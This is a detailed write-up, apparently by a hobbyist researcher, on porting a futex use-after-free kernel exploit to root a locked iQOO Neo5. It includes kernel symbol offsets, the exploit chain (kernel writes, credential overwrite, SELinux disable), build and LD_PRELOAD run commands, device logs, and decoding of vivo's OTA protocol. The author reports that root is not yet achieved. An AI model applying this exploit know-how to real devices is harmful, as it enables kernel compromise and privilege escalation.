# iQOO Neo5 (PD2055) 临时 Root 研究全记录 — CVE-2026-43499 完整实战
# iQOO Neo5 (PD2055) Temporary Root via CVE-2026-43499 — Full Write-up

> **Author**: Viper-Boss (AI 辅助: DeepSeek Harness)
> **Date**: 2026-11-08 ~ 2026-11-09
> **Device**: iQOO Neo5 (V2055A / PD2055) · 骁龙870 (Snapdragon 870) · Android 14 · OriginOS 4
> **Firmware**: PD2055_A_9.10.3 (kernel 4.19.152-perf+)
> **Status**: 🟡 kallsyms 已 6 重独立验证(109,687符号) · futex 哈希模型经两次纠错后
> 对照内核源码逐位验证 · typedef 反转 bug 已修复 · KernelSnitch 定位在原理上重新成立 ·
> **设备端尚未用修复版重测，未取得 uid=0**
>
> **纠错历史（重要）**：本仓库对 futex 哈希的结论错过两次——
> ① 初稿"内核只哈希 2 个 u32、不含 mm"（错）；
> ② e34852b"内核从 key+8 哈希 4 个 u32、仍不含 mm、KernelSnitch 方法论失效"（仍错，
>    因为对照的参考结构体也抄反了）；
> ③ 当前版本逐字核对 v4.19 `futex.h`/`futex.c`，用**独立转录**的参考结构体单测，
>    确认 **`union futex_key` 是 word@0/ptr@8/offset@16，哈希 = [addr,mm]，依赖 mm**。
>    真正的 bug 是 exploit 的 typedef 字段顺序反了（上游 K40 移植版就有）。
>
> **本轮修正**：①futex_key_t typedef 字段顺序（对齐内核）+ `_Static_assert` 钉死
> ②单元测试改用独立内核参考结构体（不再"错验错"）③推翻"方法论失效"结论
> ④`preload_diag`→`preload_noroot` 正名（它仍触发 CVE+写内核，非只读）
> ⑤kallsyms 6 重独立验证 ⑥诊断安全边界三分类

---

## 1. 我为什么要做这件事 / Why I'm doing this

我的 iQOO Neo5 的 Bootloader 锁死，**没有任何解锁路径**：
- `fastboot flashing unlock` → `unknown command`（vivo 从引导加载程序中删除了解锁命令）
- `fastboot oem unlock` → `unknown command`
- vivo 官方 BL 解锁通道多年前就已停止服务
- 该设备没有公开的签名 firehose（EDL/9008 模式无法使用）

我想要不解锁 BL 就获得临时 root，于是找到了 CVE-2026-43499 漏洞（GhostLock exploit）。这篇文章记录了我的完整旅程——包括所有死胡同——希望大家不用再浪费时间重复踩坑。

---

## 2. 总结 — 哪些可行、哪些不可行 / TL;DR

| 步骤 | 状态 | 说明 |
|------|------|------|
| CVE-2026-43499 futex UAF 触发 | ✅ 可用 | 每轮找到 3 个碰撞，设备稳定不崩溃 |
| 固件获取（7GB 全量 OTA 包） | ✅ 可用 | 破解了 vivo 老版 OTA 协议（替换密码+base64） |
| 内核 kallsyms 提取 | ✅ **6 重验证** | 109,687 符号；markers 429/429 + 段序 + 聚簇 + ARM64 抽查 |
| target.h 符号偏移 | ✅ **已修正** | 旧值因名字错位而全错，现逐符号校正 |
| futex 哈希模型 | ✅ **对照内核验证** | typedef 字段反转 bug 已修；哈希=[addr,mm]，依赖 mm；18/18 单测 |
| NDK 构建 preload/noroot/diag | ✅ 可用 | aarch64，SHA256 已记录，可复现 |
| KernelSnitch mm 定位 | 🟡 **原理成立,待重测** | 哈希不匹配根因已除；成功还需 mm尺寸/slab/扫描区间/时序/vivo未改哈希 |
| 诊断安全边界 | ✅ 已厘清 | `diag_params` 只读安全；`preload_noroot` 仍触发CVE+写内核(非只读) |
| 最终 uid=0 提权 | ⏳ **未达成** | 设备端未用修复版重测 |

---

## 3. 设备指纹（通过 adb shell 验证）

```
ro.product.model=V2055A
ro.product.device=PD2055
ro.board.platform=kona
ro.soc.model=SM8250 (骁龙870)
ro.build.version.release=14
ro.build.display.id=PD2055_A_9.10.3
ro.build.version.incremental=compiler10161353
ro.build.version.security_patch=2025-09-01
ro.build.type=user / release-keys

# 内核
Linux version 4.19.152-perf+ (compiler@comdg01150025) (clang 10.0.5)
#1 SMP PREEMPT Thu Oct 16 14:02:35 CST 2025

# 启动链
androidboot.verifiedbootstate=green
androidboot.vbmeta.device_state=locked
androidboot.veritymode=enforcing
androidboot.securebootkeyver=4
androidboot.secureboot_enable=1
```

### 内核配置要点（来自 /proc/config.gz — 无需 root 即可读取！）

```
CONFIG_ARM64_VA_BITS=39, PGTABLE_LEVELS=3
CONFIG_PREEMPT=y, CONFIG_FUTEX_PI=y, CONFIG_RT_MUTEXES=y
CONFIG_KALLSYMS=y, CONFIG_KALLSYMS_ALL=y, CONFIG_IKHEADERS=y
CONFIG_SLAB_FREELIST_RANDOM=y, CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SLUB_MIRROR=y          # ← vivo 反利用加固
CONFIG_PANIC_ON_REFCOUNT_ERROR=y
CONFIG_PANIC_ON_OOPS 未设置 (PANIC_ON_OOPS_VALUE=0)
CONFIG_MODULE_SIG_FORCE=y (sha512)
CONFIG_STATIC_USERMODEHELPER=y → /system/bin/vivo_coredump
CONFIG_RANDOMIZE_BASE=y (KASLR)
```

---

## 4. 我先踩过的死胡同（免得你也踩）

### 4.1 官方 BL 解锁
- `fastboot flashing get_unlock_ability` 返回 `1`（有解锁能力位）
- 但 `fastboot flashing unlock` → `unknown command`
- vivo 把解锁命令从引导加载程序里完全删除了
- **结论：没有 vivo 内部工具就不可能解锁**

### 4.2 市面上所有"临时 root"工具（月虹/GhostLock/DirtyFrag 等）

我下载并静态分析了约 15 种不同工具。核心发现：

**iQOO 临时 root 生态是一个按机型门控的矩阵：**

| 工具 | 目标机型 | 内核 | 在 Neo5 上可用？ |
|------|---------|------|---------------|
| GhostLock 4.19 (K40 移植版) | 红米 K40 (alioth) | 4.19.157 GKI | ❌ 偏移不同 |
| 月虹提权助手 v1.6.4 | vivo 6.6 GKI 设备 | 6.6.30/57/89 | ❌ 无 vivo 4.19 payload |
| DirtyFrag / DirtyFlag | 5.15-6.12 GKI | 仅 GKI | ❌ 不支持 4.19 |
| KSuRoot | 多种 GKI | 5.10+ | ❌ 需要 init_boot 分区（Neo5 没有） |
| 其他所有工具 | ... | ... | ❌ |

**根本原因**：Neo5（2021年，SM8250）对 GKI 时代的 exploit 生态来说太老了。这些工具都瞄准 2024-2026 年搭载 5.10+ GKI 内核的旗舰设备。Neo5 的 4.19.152 非 GKI 内核从未被适配过。

### 4.3 Recovery 模式 adb
- `adb reboot recovery` 可以进入
- 但 recovery **没有 adbd**（vivo 锁死了）
- 在设备管理器中 USB 设备甚至不枚举
- **结论：无法从 recovery 用 dd 备份分区**

### 4.4 公开固件镜像站
- vivofirmware.com：只有 PD2055_A_1.10.16（2021 年原版）
- onfix.cn、gbfirmware.com、romzj.com.cn：全部止步于 6.x（2023 年）
- **没有任何公开镜像有 9.10.3**（最终 EOL 版本）
- vivo 官方客服确认："官网已取消下载升级包的网页路径"

---

## 5. 固件获取突破（最核心的部分）

这是最难的一步。完整链条如下：

### 5.1 技巧：利用 recovery 自带的联网更新

我重启进 recovery 模式，然后使用 recovery 菜单中的"联网更新"功能。这触发了 recovery：
1. 通过 `wget --post-data param=<混淆串>&jvq=1.0.3 https://sysupgrade.vivo.com.cn/api2` 查询 vivo OTA 服务器
2. 下载一个 7GB 的全量固件包
3. 安装（类型：REPAIR，因为 pre=post=PD2055D_A_9.10.3）

### 5.2 通过 bugreport 获取证据

```bash
adb bugreport
# 提取: FS/cache/recovery/last_log
```

recovery 日志包含：
- 完整的 wget 命令和加密的 `param` 值
- 下载的包路径：`/data/vivo-others/survival/vivo-survival_1.0-UpdateFull_package.zip`
- 安装确认：`INSTALL_SUCCESS`

### 5.3 破解 vivo 老版 OTA 协议（jvq 1.0.3）

这个"加密"实际上是**替换密码 + 标准的 ASCII 明文 base64 编码**——根本不是真正的加密。

**我的破解方法：**

1. **结构分析**：加密数据中所有重复子串的间距都 ≡ 0 (mod 4)，证明是 base64（重复子串只在 mod-4 边界处保持对齐）

2. **已知明文攻击**：请求中包含设备的 IMEI 哈希（`7495e...` — 来自 bugreport 中的 `last_ota_info`）、版本字符串 `PD2055D_A_9.10.3` 和 `PD2055MA`。这些为我提供了推导符号值的锚点。

3. **爬山算法 + oracle 验证**：用推导出的字母表重新编码解码后的明文，必须产生与原始密文完全一致的结果。这验证了答案的正确性。

4. **关键 bug 修复**：标准 base64 的第三个字节公式是 `b2 = ((v2&3)<<6)|v3`，**不是 `<<4`**！这个 bug 我调了几个小时，产生了微妙的错误结果。

**解密后的响应：**

```json
{
  "fileLength": "7039074100",
  "version": "9.10.3",
  "url": "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D1Wb74zZnMyZkEQMylyN9YS0gMdN46HMkYHYggQN4FiZ9USMPFQM8DyMwZSN8FSMz1XN90",
  ...
}
```

### 5.4 下载固件

```bash
curl --noproxy '*' -L -C - --retry 30 \
  -o PD2055_A_9.10.3_full.zip \
  "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D..."
# 7,039,074,100 字节，~110 MB/s 直连 vivo CDN
```

---

## 6. 内核 kallsyms 提取

固件包中的 boot.img 使用标准 v2 头：
```
kernel_size=50759696, page_size=4096, kernel_addr=0x8000
```

### 6.1 提取内核 Image

内核数据块从偏移 `page_size`（4096）开始，但在真正的 ARM64 Image 前面有一个 52 字节的 vivo 包装头：
```
[52 字节 vivo 头][ARM64 内核 Image (48.4MB)]
```

### 6.2 vivo 的反逆向工程修改

vivo 修改了内核以阻碍 kallsyms 提取：
1. **Image 头字段清零**：`text_offset=0, image_size=0, flags=0`（正常应该是 0x80000 等）
2. **kallsyms_markers 用自定义格式**：u32 值按 8 字节步距存储（标准上游是紧凑 u32 数组）
3. **符号过滤**：从 kallsyms 中**删除了提权敏感符号**（见 6.5）

### 6.3 我自研的 kallsyms 解析器（已逐字节验证）

`vmlinux-to-elf`、`ghostlock-extract` 等工具在 vivo 的修改上都失败，我写了自定义解析器。
**最终结构（全部经 markers 交叉验证）：**

```
Offsets table:  0x1f805cc .. 0x1feb7a8   (109,687 × s32, 首值=0, 尾值=0x3b80708, 0 单调违反)
num_syms:       u32 @ 0x1feb8cc = 0x1AC77 = 109,687
Names:          0x1feb9cc .. 0x215904e   ([u8 len][tokens], 4.19 格式, 无 0x80 扩展)
Markers:        0x21590cc                (429 × u32 @ 8 字节步距)
Token table:    0x2159ecc                (256 个令牌, 909 字节, token[48]='0')
Token index:    0x215a2cc                (256 × u16, 验证 256/256)
```

**关键验证**：全部 **429 个 markers** 满足
`markers[k] == (name[256*k] 的字节偏移) − names_start`，**429/429 精确匹配**。
这从数学上证明了 names_start、num_syms、offsets 表对齐三者都逐字节正确。
`_text` 偏移 == 0，说明 offsets 已经相对 `_text`（CONFIG_KALLSYMS_BASE_RELATIVE，
relative_base 即 `_text` 的 VA）。

> 早期版本报告"109,641 个符号、names@0x1febb9b、offsets@0x1f805bc"是**错误**的：
> names 起点偏晚了 50 条，导致所有名字与偏移错位配对，`init_task`/`commit_creds`
> 等查不到。已用 num_syms(0x1AC77) 与 markers 交叉验证彻底修正为 109,687 条。

### 6.4 target.h 的关键符号（已修正的正确偏移，相对 _text）

```
_text:                    0x00000000   (relative_base)
__start_init_task:        0x02d80000   (init_task 被过滤，用段起始符号代替)
init_uts_ns:              0x02d9ffc8
empty_zero_page:          0x03069000
root_task_group:          0x030701c0
selinux_state:            0x024ce9e0
security_hook_heads:      0x024ce358
kmalloc_caches:           0x024cde48
anon_pipe_buf_ops:        0x01cfa5c0
remove_waiter (漏洞函数): 0x000d8d18
ashmem_fops:              0x01e72080
configfs_read_file:       0x0033cf50
modprobe_path:            0x02db3540
kallsyms_lookup_name:     0x0014c278
panic:                    0x000400a0
printk:                   0x000e0c28
```

### 6.5 重大发现：vivo 过滤了提权敏感符号

下列在通用内核里必然存在的符号，在本 kallsyms 中被**精确移除**：

```
commit_creds          prepare_kernel_cred    init_cred
kernel_init           init_task              _end
__init_begin          __bss_start            _edata        _sdata
```

这正是内核 exploit 工具包最常用的符号集合（经典的 `commit_creds(prepare_kernel_cred(0))`
提权、以及靠 `kallsyms_lookup_name()` 解析这些名字的工具）。**vivo 主动删除了它们。**

对本 exploit 的影响与对策：
- `init_task` → 用 **`__start_init_task`(0x02d80000)** 代替（段起始，地址等价）
- `commit_creds`/`prepare_kernel_cred` → **本 exploit 根本不调用它们**：
  root.c 用 pipe 物理内存写**直接**把 `current->cred` 的 uid/gid/caps 清零/填满
- `init_cred` → 运行时从 `init_task.real_cred` 读出（`pipe_read64`）

所以符号过滤**不致命**，但任何依赖 `kallsyms_lookup_name("commit_creds")` 的工具在此设备上都会失败。

---

## 7. 构建 exploit

我使用开源 [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40)（Apache-2.0，最初为红米 K40/骁龙870级 4.19 内核编写）作为基础。

```bash
# 在 WSL Ubuntu 26.04 中
export NDK_ROOT=~/android-ndk-r27c
CC=$NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang

# 构建 preload.so
$CC -O2 -g0 -Isrc -DTARGET_CONFIG_H="targets/pd2055-4.19.152-perf/target.h" \
    -fPIC -shared -o preload.so -pthread \
    src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c \
    src/preload.c src/su_blob.S src/wallpaper_blob.S
```

### 在设备上运行

```bash
adb push preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
```

### 运行结果（来自 fsync 日志）：

```
[+] preload starting pid=25073
[+] startup context uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1
[+] build config label=pd2055_4.19.152_perf_a14
[*] memory detected ram=0x300000000 (12 GB)
[*] futex_init hashsize=0x800 (cpus=8)
[*] found 3 collisions
[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8080000000]
...
[-] KernelSnitch mm_struct leak failed
[-] prepare_kernel_page retry 1/12
... (重试 12 次，全部失败)
```

**futex 碰撞检测正常工作**（CVE 触发是功能性的——我们可以通过时序检测哈希碰撞）。设备全程保持稳定（没有内核崩溃，感谢 `PANIC_ON_OOPS=0`）。

> **关于 `mm_struct leak failed` 的根因更新**：这次设备运行用的是**修复前**的代码
> （typedef 字段反转，见 §8.2）。碰撞发现阶段靠时序测量真实内核，所以成功；
> 但暴力反推阶段用的用户态哈希因 typedef 反转而与内核不一致，导致定位失败。
> **该根因已在 §8 修复，但尚未用修复版在真机重测**——这是下一轮的首要验证项。
> 另注：日志里 `hashsize=0x800 (cpus=8)` 是设备真实值（8 核），与主机 24 核不同。

---

## 8. 核心技术修正：futex 哈希模型（两次纠错，最终对照内核源码验证）

> **本节经历了两次重大纠错，务必读完。**
> - **第一版**（初稿）断言"内核只哈希 2 个 u32、不含 mm" → **错误**。
> - **第二版**（commit e34852b）改成"内核从 key+8 哈希 4 个 u32、仍不含 mm，
>   KernelSnitch 方法论失效" → **仍然错误**，因为我对照的参考结构体也抄反了。
> - **本版**（当前）直接逐字核对 Linux v4.19 `include/linux/futex.h` 与
>   `kernel/futex.c`，并用**独立转录**的参考结构体做单元测试 → 结论反转：
>   **哈希确实包含 mm，KernelSnitch 定位在原理上成立**。

### 8.1 权威依据：Linux v4.19 `union futex_key`（逐字核对）

来自 `include/linux/futex.h`（v4.19）：

```c
union futex_key {
    struct { unsigned long pgoff;   struct inode *inode;   int offset; } shared;
    struct { unsigned long address; struct mm_struct *mm;  int offset; } private;
    struct { unsigned long word;    void *ptr;             int offset; } both;
};
```

**LP64（arm64）字段偏移：**
```
word / address / pgoff  @ 0
ptr  / mm      / inode  @ 8
offset                  @ 16   (tail padding @ 20..23, sizeof == 24)
```

来自 `kernel/futex.c`（v4.19）的 `hash_futex()`：
```c
u32 hash = jhash2((u32*)&key->both.word,
                  (sizeof(key->both.word)+sizeof(key->both.ptr))/4,  // (8+8)/4 = 4
                  key->both.offset);
```
`&key->both.word == key+0`，所以内核哈希 **从 key+0 起的 4 个 u32**：
```
u32[0]=key+0  = word_lo = address_lo
u32[1]=key+4  = word_hi = address_hi
u32[2]=key+8  = ptr_lo  = mm_lo        ← mm 在这里！
u32[3]=key+12 = ptr_hi  = mm_hi        ← mm 在这里！
initval = both.offset = (address % PAGE_SIZE)
```
**结论：4.19 的 futex 哈希 = `jhash2([addr_lo, addr_hi, mm_lo, mm_hi], page_offset)`，
明确包含 mm 指针。** `get_futex_key()`（futex.c ~515-535 行）也证实：私有 futex 设
`both.offset = address % PAGE_SIZE; private.address = 页对齐地址(@0); private.mm = mm(@8)`，
且整个 key 由 `FUTEX_KEY_INIT` 零初始化。

### 8.2 真正的 bug：exploit 的 `futex_key_t` typedef 字段顺序反了

上游 K40 移植版（以及我 e34852b 之前照抄的版本）的 typedef 是：
```c
struct { void *mm; unsigned long address; ... } private;  // mm@0, address@8  ← 反了！
struct { uint64_t ptr; unsigned long word; ... } both;    // ptr@0, word@8    ← 反了！
```
配合"从 key+0 哈希 4 个 u32"，它实际算的是 `jhash2([mm_lo, mm_hi, addr_lo, addr_hi], ...)`，
而内核算的是 `jhash2([addr_lo, addr_hi, mm_lo, mm_hi], ...)`。jhash2 对输入顺序敏感
（单元测试已验证），所以**用户态哈希 ≠ 内核哈希**。

**这极可能就是设备端 `KernelSnitch mm_struct leak failed` 的真正根因**：
- 碰撞发现阶段用**时序侧信道测量真实内核**，所以能找到碰撞（与用户态哈希无关）；
- 但暴力反推阶段用**错误的用户态哈希**去匹配观测到的碰撞模式，
  于是找到错误的 mm（或找不到）→ 泄漏失败。

### 8.3 修复（`exploit/src/kernelsnitch/futex_hash.h`）

1. **typedef 改为与内核一致**：`word/address@0, ptr/mm@8, offset@16`。
2. **加 `_Static_assert`** 钉死全部字段偏移与 `sizeof==24`，任何回归都会编译失败：
   ```c
   _Static_assert(offsetof(futex_key_t, both.word)==0, ...);
   _Static_assert(offsetof(futex_key_t, both.ptr)==8, ...);
   _Static_assert(offsetof(futex_key_t, private.mm)==8, ...);
   ```
3. `futex_hash_no_trunc()` 用 `&key->both.word`（修正后即 key+0）起、4 个 u32。
4. `futex_hash()` 用 `memset` 清零（等价内核 `FUTEX_KEY_INIT`），消除 padding 不确定性。
5. 修正 `FUTEX_KEY_INIT` 宏（原引用不存在的 `union futex_key` 类型，从未编译通过）。

### 8.4 单元测试（独立参考实现，`make test`，主机 gcc，不触发漏洞）

**关键：测试用的参考结构体直接从内核头文件转录，绝不复制 exploit 的 typedef**
（上一版正是"用错误参考验证错误代码"才得出错误结论）。结果 18/18 PASS：
```
[PASS] exploit futex_key_t layout == kernel reference (word@0/ptr@8/offset@16)
[PASS] full 32-bit hash matches reference for all cases  (7/7)
[PASS] futex_hash() wrapper bucket == reference bucket
[PASS] reference hash differs for different mm (mm IS hashed)
[PASS] exploit hash differs for different mm
[PASS] legacy reversed layout does NOT match kernel (bug was real)
[PASS] jhash2 is order-sensitive (why field order matters)
[PASS] probe reports mm-DEPENDENT hash
```

### 8.5 对 KernelSnitch 可行性的重新评价（诚实版）

修复后，用户态哈希与内核 v4.19 `hash_futex()` **逐位一致**，且**依赖 mm**。
因此 KernelSnitch 的 mm 定位**在原理上重新成立**——之前判定"方法论失效"是基于
反转参考的错误结论，现予以推翻。

**但"哈希依赖 mm"只是必要条件，绝不等于定位一定成功。** 仍需同时满足：
1. **正确的 `mm_struct` 大小**：已修正为 0x3C0（960，设备 slabinfo 实测），
   旧值 0x340 会让候选步长错误。
2. **正确的 slab order/几何**：order 3（8 页/slab，34 obj/slab），已修正 `util.c`
   重试逻辑（原本错误地把 `mm_slab_order` 重置为 0）。
3. **准确的 identity-map 扫描区间**：依赖 `DIRECT_MAP_BASE/END` 与实测 RAM（12GB）。
4. **足够低的时序噪声**：碰撞测量受调度干扰，vivo 的 SLUB_MIRROR 等加固可能影响。
5. **vivo 未修改 `hash_futex()`**：**这是未验证假设**。我对照的是上游 v4.19，
   尚未反汇编 PD2055 boot.img 内的实际 `hash_futex()` 确认 vivo 没有改动。

我保留了一个**健全性门控** `futex_hash_mm_dependent()`：若某内核上哈希**不**依赖 mm
（说明布局回归或内核改了哈希），`kernelsnitch_bruteforce()` 会拒绝运行并报错，
避免返回假阳性地址。在正确的 4.19 布局下该门控通过（探针返回 1）。

**当前状态：设备端尚未用修复版重测。** 上一轮设备失败的一个**已确认根因**
（typedef 反转导致哈希不匹配）已消除，但是否能成功定位 mm 仍需真机验证。

### 8.6 slabinfo 补充数据（设备实测，已验证）
```
mm_struct: objsize=960 (0x3C0), 34 objects/slab, 8 pages/slab → order 3
vivo 额外引入 kmalloc-rcl-*（reclaim）缓存类型
```

---

## 9. 本仓库的关键文件和工具

| 文件 | 说明 |
|------|------|
| `exploit/src/targets/pd2055-4.19.152-perf/target.h` | PD2055 完整偏移表（已修正，markers 验证） |
| `kallsyms.txt` | 完整内核符号表（**109,687** 条目，已验证） |
| `target_offsets.txt` | target.h 的格式化偏移值 |
| `boot.img` (96MB) | 从固件包提取的内核镜像，供社区分析 |
| `xbl_config.elf` | XBL 配置（物理加载地址推导） |
| `exploit/` | 修改后的 GhostLock exploit 源码（含修正的 futex_hash.h） |
| `exploit/src/diag_params.c` | **只读**参数诊断组件（不触发漏洞） |
| `exploit/tests/test_futex_hash.c` | futex 哈希单元测试（主机可跑，16 项） |
| `exploit/Makefile` | 可复现构建（默认 PD2055，含 `test`/`diag`/`diag-payload`） |
| `scripts/` | 全部分析脚本（kallsyms 解析器、OTA 解密器等） |
| `tools/vivo_ota.py` | 独立的 vivo OTA 协议解密/查询/下载工具 |
| `analysis/` | 解密后的 OTA 响应、字母表、slabinfo |
| `logs/` | 设备上的 exploit 执行日志 |

---

## 10. 复现步骤（可复现构建）

```bash
# 0. 环境：WSL2 Ubuntu + Android NDK r27c
export NDK_ROOT=~/android-ndk-r27c        # 或 ANDROID_NDK_HOME
cd exploit

# 1. 主机单元测试（不需要 NDK，不触发漏洞，纯算法验证）
make test          # 编译并运行 test_futex_hash + diag_params(host)

# 2. 【只读安全】参数诊断（设备端，验证 target.h 与真机 slabinfo/CPU 一致）
NDK_ROOT=$NDK_ROOT make diag
adb push build/pd2055-4.19.152-perf/bin/diag_params /data/local/tmp/
adb shell /data/local/tmp/diag_params      # 只读，不触发CVE，退出码 0=全部通过

# 3. 从固件提取 boot.img 并解析 kallsyms（见 scripts/）
python3 -c "import zipfile; zipfile.ZipFile('PD2055_A_9.10.3_full.zip').extract('boot.img')"
python3 scripts/verify_kallsyms.py

# ---- 以下是活跃 exploit 构建，会触发 CVE 并写内核，仅在你自己设备上用 ----
# 4. 完整 payload（含最终提权：改cred/关SELinux/装su/改壁纸）
NDK_ROOT=$NDK_ROOT make preload            # -> build/.../preload.so

# 5. noroot payload（仍触发CVE+写内核，只去掉最终提权阶段；非只读！）
NDK_ROOT=$NDK_ROOT make noroot-payload     # -> build/.../preload_noroot.so
```

构建产物均打印 SHA256；任一步失败返回非零退出码。
`make list-projects` 列出可用 target；`make info` 打印解析到的工具链。

---

## 11. 诊断安全边界：三类程序的严格区分（重要）

> **上一版把 `preload_diag.so` 称作"只读诊断"是错误的、危险的。** 它实际仍会触发
> CVE 并写内核内存。本节按"是否修改内核状态"把仓库里的可执行物**严格三分类**。

### 类别 A — 完全只读，安全（`diag_params`）

`make diag` 产物。**不触发任何漏洞、不写任何内存/分区**。它只做：
- 纯内存计算：futex 哈希、`futex_hash_mm_dependent()` 探针、jhash2；
- 只读文件：`/proc/slabinfo`、`/sys/devices/system/cpu/possible`、`uname`；
- 用途：在真机核对 target.h 的 mm_struct 大小/slab order/CPU 数/hashsize 是否吻合。

**这是唯一可以无条件在真机运行的工具。** 退出码 0=全部通过。

### 类别 B — 仅内存计算的算法验证（`make test`，主机）

`tests/test_futex_hash.c`。在**开发主机**（非设备）用 gcc 编译运行，
对照独立转录的内核参考结构体验证 futex 哈希。**完全不碰设备、不触发漏洞。**

### 类别 C — 活跃漏洞利用程序，会修改内核状态（`preload.so` / `preload_noroot.so`）

⚠️ **两者都是真正的 exploit，都不是只读诊断。** 调用链（`main.c: run_exploit`）：

```
slide_leak_kernel_base()        -> prepare_good_kernel_page()   [触发 CVE-2026-43499]
prepare_good_kernel_page(FOPS)  -> futex PI requeue UAF         [堆喷 + 取内核页]
run_main_route_threads()        -> FUTEX_CMP_REQUEUE_PI         [UAF 触发]
fops.c: configfs_write_once()   -> 写内核内存（劫持 file_operations / 绕 CFI）
pipe.c                          -> 建立物理读写原语
```

`preload.so` 与 `preload_noroot.so` 的**唯一区别**是最后一步：

| 阶段 | `preload.so`(FULL) | `preload_noroot.so`(NOROOT) |
|------|:--:|:--:|
| 触发 CVE / 写内核 / physrw 原语 | ✅ 执行 | ✅ **仍执行** |
| 改 cred uid/gid/caps（提权） | ✅ | ❌ 编译排除 |
| 关 SELinux（写 enforcing） | ✅ | ❌ |
| 装 su daemon / tmpfs mount / chcon | ✅ | ❌ |
| 改壁纸 / `kill(system_server)` | ✅ | ❌ |

`GHOSTLOCK_NO_DESTRUCTIVE`（→ `preload_noroot.so`）只砍掉**最终提权+持久化+系统改动**，
**前面的漏洞触发和内核写入照常发生**，仍可能崩溃内核。因此它**不是**只读诊断，
命名也从误导性的 `preload_diag` 改为 `preload_noroot`。

### 边界声明

- **无法证明类别 C 的任何构建"不修改内核状态"**——它们本就是 exploit。
  因此本仓库**不提供**"自动在真机运行 exploit"的一键指令；§16 只列类别 A 的只读命令。
- 运行类别 C 需研究者**显式**构建并**自行承担**内核崩溃/设备风险，仅用于自有硬件。
- 完整 payload **不含**任何 boot/vbmeta/abl/xbl/devinfo 分区写入或擦除/刷机；
  持久化最多到"装 su daemon + 改壁纸"，且这些在 noroot 版全部禁用。

验证（特征字符串对比，确认 noroot 版确实砍掉了最终阶段）：
```
preload_noroot.so 含:  GHOSTLOCK_NO_DESTRUCTIVE / NO-ROOT research / root(diag)
preload_noroot.so 不含: "embedded su daemon ready" / "wallpaper install data="
preload.so 含:         "embedded su daemon ready" / "wallpaper install data="
```

---

## 12. Bootloader 锁状态（纯静态分析，未尝试解锁）

设备事实（adb 读取）：
```
fastboot flashing get_unlock_ability = 1
fastboot flashing unlock             = unknown command
fastboot oem unlock                  = unknown command
androidboot.verifiedbootstate = green
androidboot.vbmeta.device_state = locked
androidboot.veritymode = enforcing
androidboot.securebootkeyver = 4 ; secureboot_enable = 1
```

静态分析结论（**均为推断，未验证**）：

1. **谁管理锁状态**：vivo 设备的解锁状态通常存于 `devinfo`/`frp` 分区的一个标志位，
   由 ABL（`abl.elf`，Android Bootloader）在 fastboot 阶段读取，并写进
   `androidboot.vbmeta.device_state` 传给 AVB。`get_unlock_ability=1` 只表示
   "策略上允许解锁"这个 bit 被置位，**不代表解锁命令存在**。
2. **`get_unlock_ability=1` 的含义**：这是 `fastboot flashing get_unlock_ability`
   返回的标准能力位。vivo 把 `flashing unlock`/`oem unlock` 的**命令处理**从 ABL 里
   删掉了，所以能力位为 1 但命令 `unknown` —— 二者不矛盾。
3. **AVB / Secure Boot / 锁的关系**：`secureboot_enable=1` + `keyver=4` 说明 PBL→XBL→ABL
   链是签名校验的；`verifiedbootstate=green` 表示 vbmeta 校验通过且设备 locked。
   locked 状态下 AVB 强制校验 boot/vbmeta，改 boot.img 会导致 `red` 且拒绝启动。
4. **`xbl_config.elf` 能提供什么**：内含 FDT（内存映射、外设基址），可用于推导
   内核物理加载地址，**但不含**解锁逻辑或 devinfo 标志（那在 abl.elf / 分区里）。
5. **还缺哪些材料**（若要继续 BL 研究）：`abl.elf`、`devinfo`/`frp` 分区镜像、
   `vbmeta.img`、fastboot 全量 `getvar all` 输出、以及各阶段串口日志。

**明确不做**：不修改锁状态属性、不盲写分区、不伪造解锁。当前路线是**临时 root**
（内存态提权，重启即失效），与 BL 解锁、持久化 root 是三件不同的事——见 §13。

---

## 13. 临时 Root / 持久化 Root / Bootloader 解锁 —— 三者区分

| 维度 | 临时 Root（本项目目标） | 持久化 Root | Bootloader 解锁 |
|------|------------------------|-------------|-----------------|
| 手段 | CVE-2026-43499 内存提权 | 改 boot/装 Magisk | fastboot flashing unlock |
| 存活 | **重启即失效** | 跨重启保留 | 永久改变设备状态 |
| 需要 BL 解锁? | **否** | 通常是 | —— |
| 本设备可行? | 研究中（见 §8.5 待重测） | 否（locked+AVB green） | **否**（命令被删） |
| 会触发 AVB red? | 否（不改分区） | 会 | 会（变 orange/unlocked） |

本仓库**只**追求临时 root：全程不写 boot/vbmeta/任何分区，重启后设备恢复原状。

---

## 14. 验证与验收（真实结果，未伪造）

| 测试项 | 命令 | 结果 |
|--------|------|------|
| futex_key_t 布局 == 内核参考 | `make test` | **PASS**（word@0/ptr@8/offset@16, sizeof 24） |
| futex 哈希 vs **独立**内核参考 | `make test` | **PASS 7/7**（逐位一致） |
| 哈希依赖 mm | `make test` | **PASS**（不同 mm → 不同哈希） |
| 旧反转布局确实错误 | `make test` | **PASS**（复现 bug，与内核不符） |
| mm-dependency 探针 | `make test` | **PASS**（返回 1） |
| mm_struct slab 算术 | `make test` | **PASS**（0x3C0→34 obj/slab） |
| 单元测试合计 | `make test` | **18/18 PASS** + diag 4/4(2 skip) |
| kallsyms markers 交叉验证 | `scripts/reverify_kallsyms.py` | **PASS 429/429** |
| kallsyms 计数一致 | 同上 | **PASS**（offsets==names==num_syms=109687） |
| kallsyms 段序(text<rodata<data<bss) | 同上 | **PASS**（独立证明配对正确） |
| kallsyms 同源符号聚簇 | 同上 | **PASS**（ashmem/cred/configfs 各<2.6KB） |
| kallsyms ARM64 代码抽查 | 同上 | **PASS 10/10**（text 符号指向真实指令） |
| aarch64 FULL payload 构建 | `make preload` | **PASS** sha256 79ecfc01… |
| aarch64 NOROOT payload 构建 | `make noroot-payload` | **PASS** sha256 ef5d9178… |
| aarch64 diag_params 构建 | `make diag` | **PASS** sha256 f21aed7d… |
| noroot 版排除最终提权代码 | strings 对比 | **PASS**（su/wallpaper 路径 absent） |
